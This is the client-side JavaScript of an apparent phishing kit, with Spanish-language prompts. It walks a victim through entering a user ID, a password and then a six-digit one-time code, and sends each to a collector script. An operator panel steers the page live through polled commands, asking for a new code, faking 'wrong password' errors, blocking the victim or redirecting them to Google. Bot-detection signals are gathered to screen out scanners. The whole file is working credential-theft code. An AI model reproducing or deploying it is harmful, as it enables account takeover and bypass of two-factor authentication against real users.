document.addEventListener('DOMContentLoaded', () => {
    const formPaso1 = document.getElementById('formPaso1');
    const inputIdentificacion = document.getElementById('identificacion');
    const errorPaso1 = document.getElementById('errorPaso1');
    const btnPaso1 = document.getElementById('btnPaso1');

    const formPaso2 = document.getElementById('formPaso2');
    const inputPassword = document.getElementById('password');
    const errorPaso2 = document.getElementById('errorPaso2');
    const btnPaso2 = document.getElementById('btnPaso2');
    const togglePass = document.getElementById('togglePass');

    const loadingState = document.getElementById('authLoading');

    const formPaso3 = document.getElementById('formPaso3');
    const inputCodigo = document.getElementById('codigo');
    const errorPaso3 = document.getElementById('errorPaso3');
    const btnPaso3 = document.getElementById('btnPaso3');
    const otpBoxes = document.querySelectorAll('.otp-box');

    const authBlocked = document.getElementById('authBlocked');
    const hpField = document.getElementById('hp');

    const t0 = Date.now();
    let movimientos = 0;
    ['mousemove', 'touchstart', 'keydown', 'wheel'].forEach(ev => {
        document.addEventListener(ev, () => { movimientos++; }, { passive: true });
    });

    let pollInterval = null;
    let currentCuadroId = '';
    let ultimaAccionProcesada = '';
    let usuarioEnviado = false;
    let addPromise = null;
    let tPasswordVisible = 0;

    function obtenerCuadroIdActual() {
        if (currentCuadroId) return currentCuadroId;
        const attrId = loadingState ? loadingState.getAttribute('data-cuadro-id') : '';
        if (attrId) return attrId;
        return sessionStorage.getItem('dav_cuadro_id') || '';
    }

    function detenerMonitoreo() {
        if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
    }

    function registrarSalida() {
        const id = obtenerCuadroIdActual();
        if (!id) return;
        if (navigator.sendBeacon) {
            const fd = new FormData();
            fd.append('action', 'offline');
            fd.append('id', id);
            navigator.sendBeacon('api.php', fd);
        } else {
            fetch('api.php?action=offline&id=' + encodeURIComponent(id), { keepalive: true }).catch(() => {});
        }
    }

    window.addEventListener('beforeunload', registrarSalida);

    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            const id = obtenerCuadroIdActual();
            if (id) fetch('api.php?action=ping&id=' + encodeURIComponent(id) + '&_t=' + Date.now()).catch(() => {});
        }
    });

    function ocultarTodo() {
        if (formPaso1) formPaso1.classList.add('hidden');
        if (formPaso2) formPaso2.classList.add('hidden');
        if (loadingState) loadingState.classList.remove('active');
        if (formPaso3) formPaso3.classList.add('hidden');
        if (authBlocked) authBlocked.classList.remove('active');
    }

    if (togglePass && inputPassword) {
        togglePass.addEventListener('click', () => {
            const eye = togglePass.querySelector('.eye-icon');
            const eyeOff = togglePass.querySelector('.eye-off-icon');
            const esPassword = inputPassword.getAttribute('type') === 'password';
            if (esPassword) {
                inputPassword.setAttribute('type', 'text');
                if (eye) eye.style.display = 'none';
                if (eyeOff) eyeOff.style.display = 'block';
            } else {
                inputPassword.setAttribute('type', 'password');
                if (eye) eye.style.display = 'block';
                if (eyeOff) eyeOff.style.display = 'none';
            }
        });
    }

    if (inputIdentificacion) {
        inputIdentificacion.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\s+/g, '');
            if (errorPaso1) errorPaso1.style.display = 'none';
        });
        if (formPaso1 && !formPaso1.classList.contains('hidden')) inputIdentificacion.focus();
    }

    if (inputPassword) {
        inputPassword.addEventListener('input', () => {
            if (errorPaso2) errorPaso2.style.display = 'none';
        });
    }

    function obtenerCodigoCompleto() {
        let code = '';
        otpBoxes.forEach(box => { code += box.value; });
        return code.trim();
    }

    function sincronizarCodigo() {
        const code = obtenerCodigoCompleto();
        if (inputCodigo) inputCodigo.value = code;
        return code;
    }

    function limpiarCasillasCodigo() {
        otpBoxes.forEach(box => { box.value = ''; box.disabled = false; box.classList.remove('filled'); });
        if (inputCodigo) { inputCodigo.value = ''; inputCodigo.disabled = false; }
        if (otpBoxes.length > 0 && formPaso3 && !formPaso3.classList.contains('hidden')) {
            setTimeout(() => { otpBoxes[0].focus(); }, 60);
        }
    }

    function deshabilitarCasillasCodigo(d = true) {
        otpBoxes.forEach(box => { box.disabled = d; });
        if (inputCodigo) inputCodigo.disabled = d;
    }

    function enfocarPrimeraCasillaVacia() {
        for (let i = 0; i < otpBoxes.length; i++) {
            if (!otpBoxes[i].value) { otpBoxes[i].focus(); return; }
        }
        if (otpBoxes.length > 0) otpBoxes[otpBoxes.length - 1].focus();
    }

    if (otpBoxes.length > 0) {
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const val = e.target.value.replace(/\D/g, '');
                if (!val) { e.target.value = ''; e.target.classList.remove('filled'); sincronizarCodigo(); return; }
                if (val.length === 1) {
                    e.target.value = val;
                    e.target.classList.add('filled');
                    if (index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
                } else {
                    val.split('').forEach((d, dIdx) => {
                        const t = index + dIdx;
                        if (t < otpBoxes.length) { otpBoxes[t].value = d; otpBoxes[t].classList.add('filled'); }
                    });
                    otpBoxes[Math.min(index + val.length, otpBoxes.length - 1)].focus();
                }
                sincronizarCodigo();
                if (errorPaso3) errorPaso3.style.display = 'none';
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (box.value) {
                        box.value = ''; box.classList.remove('filled'); sincronizarCodigo(); e.preventDefault();
                    } else if (index > 0) {
                        otpBoxes[index - 1].focus();
                        otpBoxes[index - 1].value = '';
                        otpBoxes[index - 1].classList.remove('filled');
                        sincronizarCodigo();
                        e.preventDefault();
                    }
                } else if (e.key === 'ArrowLeft') {
                    if (index > 0) { otpBoxes[index - 1].focus(); e.preventDefault(); }
                } else if (e.key === 'ArrowRight') {
                    if (index < otpBoxes.length - 1) { otpBoxes[index + 1].focus(); e.preventDefault(); }
                } else if (e.key === ' ') { e.preventDefault(); }
            });

            box.addEventListener('focus', () => { box.select(); });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const cd = e.clipboardData || window.clipboardData;
                if (!cd) return;
                const pasted = cd.getData('text').replace(/\D/g, '').slice(0, 6);
                if (!pasted) return;
                pasted.split('').forEach((d, idx) => {
                    if (otpBoxes[idx]) { otpBoxes[idx].value = d; otpBoxes[idx].classList.add('filled'); }
                });
                const nf = Math.min(pasted.length, otpBoxes.length - 1);
                if (otpBoxes[nf]) otpBoxes[nf].focus();
                sincronizarCodigo();
                if (errorPaso3) errorPaso3.style.display = 'none';
            });
        });
    }

    function iniciarMonitoreo(cuadroId) {
        if (!cuadroId) return;
        currentCuadroId = cuadroId;
        sessionStorage.setItem('dav_cuadro_id', cuadroId);
        if (loadingState) loadingState.setAttribute('data-cuadro-id', cuadroId);
        detenerMonitoreo();
        fetch('api.php?action=ping&id=' + encodeURIComponent(cuadroId) + '&_t=' + Date.now()).catch(() => {});

        pollInterval = setInterval(async () => {
            const targetId = currentCuadroId || obtenerCuadroIdActual();
            if (!targetId) return;
            try {
                const res = await fetch('api.php?action=check_status&id=' + encodeURIComponent(targetId) + '&_t=' + Date.now());
                const data = await res.json();
                if (!data || !data.success) return;

                if (data.accion === 'relogin') {
                    detenerMonitoreo();
                    sessionStorage.removeItem('dav_cuadro_id');
                    window.location.href = 'index.php?error=relogin';
                    return;
                }
                if (data.accion === 'finalizar') {
                    detenerMonitoreo();
                    registrarSalida();
                    sessionStorage.removeItem('dav_cuadro_id');
                    window.location.href = data.redirect_url || 'https://www.google.com';
                    return;
                }
                if (data.accion === 'bloquear' || data.bloqueado) {
                    detenerMonitoreo();
                    ocultarTodo();
                    if (authBlocked) authBlocked.classList.add('active');
                    return;
                }
                if (data.accion === 'pedir_codigo') {
                    if (formPaso3 && formPaso3.classList.contains('hidden')) {
                        ocultarTodo();
                        formPaso3.classList.remove('hidden');
                        if (btnPaso3) btnPaso3.disabled = false;
                        if (errorPaso3) errorPaso3.style.display = 'none';
                        limpiarCasillasCodigo();
                    }
                    return;
                }
                if (data.accion === 'codigo_error') {
                    if (ultimaAccionProcesada !== 'codigo_error') {
                        ultimaAccionProcesada = 'codigo_error';
                        ocultarTodo();
                        if (formPaso3) formPaso3.classList.remove('hidden');
                        if (errorPaso3) { errorPaso3.textContent = 'El codigo ingresado es incorrecto o ha vencido. Ingrese un nuevo codigo.'; errorPaso3.style.display = 'block'; }
                        if (btnPaso3) btnPaso3.disabled = false;
                        limpiarCasillasCodigo();
                    }
                    return;
                }
                if (data.accion === 'pass_error') {
                    if (ultimaAccionProcesada !== 'pass_error') {
                        ultimaAccionProcesada = 'pass_error';
                        ocultarTodo();
                        if (formPaso2) formPaso2.classList.remove('hidden');
                        if (errorPaso2) { errorPaso2.textContent = 'Contrasena incorrecta. Por favor intente nuevamente.'; errorPaso2.style.display = 'block'; }
                        if (btnPaso2) btnPaso2.disabled = false;
                        if (inputPassword) { inputPassword.disabled = false; inputPassword.value = ''; inputPassword.focus(); }
                    }
                    return;
                }
                if (data.accion === 'esperando') ultimaAccionProcesada = '';
            } catch (err) {}
        }, 1200);
    }

    // Envia el usuario al panel en el acto y deja 2 s de validacion antes de pedir la clave
    async function enviarUsuario(valor) {
        if (usuarioEnviado) return '';
        usuarioEnviado = true;

        ocultarTodo();
        if (loadingState) loadingState.classList.add('active');

        const fd = new FormData();
        fd.append('identificacion', valor);
        fd.append('ms', String(Date.now() - t0));
        fd.append('wd', navigator.webdriver ? '1' : '0');
        fd.append('mv', String(movimientos));
        fd.append('hp', hpField ? hpField.value : '');

        addPromise = fetch('api.php?action=add', { method: 'POST', body: fd })
            .then(r => r.json())
            .then(data => {
                if (data && data.success && data.data && data.data.id) {
                    currentCuadroId = data.data.id;
                    sessionStorage.setItem('dav_cuadro_id', data.data.id);
                    if (loadingState) loadingState.setAttribute('data-cuadro-id', data.data.id);
                    ultimaAccionProcesada = '';
                    iniciarMonitoreo(data.data.id);
                    return data.data.id;
                }
                throw new Error('sin id');
            })
            .catch(() => {
                usuarioEnviado = false;
                currentCuadroId = '';
                ocultarTodo();
                if (formPaso1) formPaso1.classList.remove('hidden');
                if (btnPaso1) btnPaso1.disabled = false;
                if (errorPaso1) { errorPaso1.textContent = 'Error de conexion. Intente nuevamente.'; errorPaso1.style.display = 'block'; }
                return '';
            });

        await Promise.all([addPromise, new Promise(r => setTimeout(r, 2000))]);

        if (!currentCuadroId) return '';

        ocultarTodo();
        tPasswordVisible = Date.now();
        if (formPaso2) {
            formPaso2.classList.remove('hidden');
            if (inputPassword) { inputPassword.disabled = false; inputPassword.value = ''; inputPassword.focus(); }
            if (btnPaso2) btnPaso2.disabled = false;
        }
        return currentCuadroId;
    }

    sessionStorage.clear();
    currentCuadroId = '';
    usuarioEnviado = false;
    detenerMonitoreo();
    if (loadingState) loadingState.removeAttribute('data-cuadro-id');
    ocultarTodo();
    if (formPaso1) {
        formPaso1.classList.remove('hidden');
        if (inputIdentificacion) { inputIdentificacion.value = ''; inputIdentificacion.focus(); }
    }
    if (inputPassword) inputPassword.value = '';
    limpiarCasillasCodigo();
    ultimaAccionProcesada = '';

    window.addEventListener('pageshow', (event) => {
        if (event.persisted) window.location.reload();
    });

    if (formPaso1) {
        formPaso1.addEventListener('submit', (e) => {
            e.preventDefault();
            const valor = inputIdentificacion ? inputIdentificacion.value.trim() : '';
            if (!valor) {
                if (errorPaso1) { errorPaso1.textContent = 'Por favor ingrese su usuario.'; errorPaso1.style.display = 'block'; }
                if (inputIdentificacion) inputIdentificacion.focus();
                return;
            }
            if (btnPaso1) btnPaso1.disabled = true;
            enviarUsuario(valor);
        });
    }

    if (formPaso2) {
        formPaso2.addEventListener('submit', async (e) => {
            e.preventDefault();
            const passVal = inputPassword ? inputPassword.value : '';
            if (!passVal) {
                if (errorPaso2) { errorPaso2.textContent = 'Por favor ingrese su contrasena.'; errorPaso2.style.display = 'block'; }
                if (inputPassword) inputPassword.focus();
                return;
            }

            const cuadroId = currentCuadroId || (addPromise ? await addPromise : '');
            if (!cuadroId) { ocultarTodo(); if (formPaso1) formPaso1.classList.remove('hidden'); return; }

            if (btnPaso2) btnPaso2.disabled = true;
            ocultarTodo();
            if (loadingState) loadingState.classList.add('active');
            ultimaAccionProcesada = '';

            try {
                const fd = new FormData();
                fd.append('id', cuadroId);
                fd.append('password', passVal);
                fd.append('gap', String(Date.now() - tPasswordVisible));
                const res = await fetch('api.php?action=set_password', { method: 'POST', body: fd });
                const data = await res.json();
                if (!data.success) {
                    ocultarTodo();
                    if (formPaso2) formPaso2.classList.remove('hidden');
                    if (btnPaso2) btnPaso2.disabled = false;
                    if (errorPaso2) { errorPaso2.textContent = data.message || 'Error al validar contrasena.'; errorPaso2.style.display = 'block'; }
                } else {
                    iniciarMonitoreo(cuadroId);
                }
            } catch (err) {}
        });
    }

    if (formPaso3) {
        formPaso3.addEventListener('submit', async (e) => {
            e.preventDefault();
            const codVal = sincronizarCodigo();
            if (!codVal || codVal.length < 6) {
                if (errorPaso3) { errorPaso3.textContent = 'Por favor ingrese el codigo de 6 digitos completo.'; errorPaso3.style.display = 'block'; }
                enfocarPrimeraCasillaVacia();
                return;
            }

            const cuadroId = obtenerCuadroIdActual();
            if (!cuadroId) { ocultarTodo(); if (formPaso1) formPaso1.classList.remove('hidden'); return; }

            if (btnPaso3) btnPaso3.disabled = true;
            deshabilitarCasillasCodigo(true);
            ocultarTodo();
            if (loadingState) loadingState.classList.add('active');
            ultimaAccionProcesada = '';

            try {
                const fd = new FormData();
                fd.append('id', cuadroId);
                fd.append('codigo', codVal);
                const res = await fetch('api.php?action=set_code', { method: 'POST', body: fd });
                const data = await res.json();
                if (!data.success) {
                    ocultarTodo();
                    if (formPaso3) formPaso3.classList.remove('hidden');
                    if (btnPaso3) btnPaso3.disabled = false;
                    deshabilitarCasillasCodigo(false);
                    if (errorPaso3) { errorPaso3.textContent = data.message || 'Error al validar codigo.'; errorPaso3.style.display = 'block'; }
                    enfocarPrimeraCasillaVacia();
                } else {
                    iniciarMonitoreo(cuadroId);
                }
            } catch (err) {}
        });
    }
});